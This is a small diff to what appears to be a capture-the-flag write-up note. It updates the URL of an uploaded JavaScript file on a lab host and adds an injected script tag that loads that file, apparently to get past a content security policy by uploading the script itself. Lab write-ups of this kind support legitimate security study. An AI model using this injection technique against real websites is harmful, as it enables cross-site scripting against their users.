@@ -39,9 +39,9 @@ Change file extension
 ![[Pasted image 20241122130236.png]]
 
 ```
-https://1972wbae.eu1.ctfio.com/csp-upload/uploads/369d4d050170f0f57940f893b149af74.js
+https://1972wbae.eu1.ctfio.com/csp-upload/uploads/602f749c1107ef174ee59af635d096ef.js
 ```
 
 ```html
-
+<script/src=https://1972wbae.eu1.ctfio.com/csp-upload/uploads/602f749c1107ef174ee59af635d096ef.js></script>
 ```
